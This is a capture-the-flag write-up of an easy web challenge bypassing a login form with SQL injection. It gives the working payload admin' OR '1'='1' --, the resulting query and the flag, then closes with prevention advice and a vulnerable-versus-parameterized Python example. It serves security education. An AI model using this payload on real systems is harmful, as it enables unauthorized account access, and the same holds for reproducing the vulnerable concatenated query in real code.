---
layout: post
title: "SQL Injection Login Bypass"
date: 2025-12-15
category: web
tags: [sqli, authentication, database]
---

A classic SQL injection challenge involving authentication bypass through vulnerable login forms.

## Challenge Overview

**Challenge Name:** SQL Login Bypass  
**Difficulty:** Easy  
**Points:** 100  
**Category:** Web Exploitation

The challenge presents a simple login form that's vulnerable to SQL injection attacks.

## Enumeration / Recon

Visiting the challenge URL, I found a basic login page with username and password fields. Initial testing revealed:

- Standard HTML form with POST method
- No client-side validation
- Error messages expose database information
- Server: Apache/2.4.29

Testing with single quote (`'`) in the username field returned a database error:

```
SQL Error: You have an error in your SQL syntax near '\'' at line 1
```

This confirms SQL injection vulnerability.

## Vulnerability Analysis / Findings

The login query appears to be constructed like:

```sql
SELECT * FROM users WHERE username='$username' AND password='$password'
```

Key vulnerabilities identified:
1. No input sanitization
2. Direct user input in SQL query
3. Error messages leak database structure
4. No WAF or protection mechanisms

## Exploitation / Solution

Using classic SQL injection payload to bypass authentication:

**Username:** `admin' OR '1'='1' --`  
**Password:** `anything`

This modifies the query to:

```sql
SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='anything'
```

The `--` comments out the rest of the query, and `'1'='1'` is always true, bypassing authentication.

Successfully logged in as admin and retrieved the flag from the dashboard.

## Flag

```
Flag{sql_1nj3ct10n_cl4ss1c_bypass}
```

## Lessons Learned

1. **Always use parameterized queries** - Never concatenate user input directly into SQL
2. **Input validation** - Validate and sanitize all user inputs
3. **Error handling** - Don't expose database errors to users
4. **Least privilege** - Database users should have minimal necessary permissions
5. **WAF deployment** - Web Application Firewalls can help detect and block SQL injection attempts

### Prevention Code Example

```python
# Vulnerable code
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"

# Secure code using parameterized queries
cursor.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password))
```
